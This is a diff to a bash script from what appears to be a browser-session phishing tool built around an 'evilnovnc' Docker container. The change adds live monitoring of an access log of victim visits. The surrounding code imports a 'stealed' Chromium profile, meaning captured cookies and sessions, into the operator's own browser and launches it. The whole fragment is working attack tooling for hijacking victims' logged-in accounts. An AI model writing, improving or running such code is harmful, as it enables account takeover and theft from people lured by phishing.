@@ -64,11 +64,23 @@ RESOLUTION=$(head -1 /tmp/resolution.txt 2> /dev/null) ; done
 else printf "\n\e[1;32m[+] Avoiding dynamic resolution steps.." ; sleep 2 ; fi
 printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
 printf "\n\e[1;32m[+] Cookies will be updated every 30 seconds.. \e[1;31m"
+printf "\n\e[1;36m[+] Access log: watching Downloads/access.log\e[1;0m"
+
+touch "$PWD/Downloads/access.log"
+logfile="$PWD/Downloads/access.log"
+last_lines=$(wc -l < "$logfile" 2>/dev/null || echo 0)
 
 trap 'printf "\n\e[1;33m[>] Import stealed session to Chromium..\n" ; sleep 2
 sudo docker stop evilnovnc > /dev/null 2>&1 &
 rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
 /bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
 printf "\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT
-while true ; do sleep 30 ; done 
+while true ; do
+  sleep 5
+  current=$(wc -l < "$logfile" 2>/dev/null || echo 0)
+  if (( current > last_lines )) ; then
+    tail -n $(( current - last_lines )) "$logfile"
+    last_lines=$current
+  fi
+done
 fi
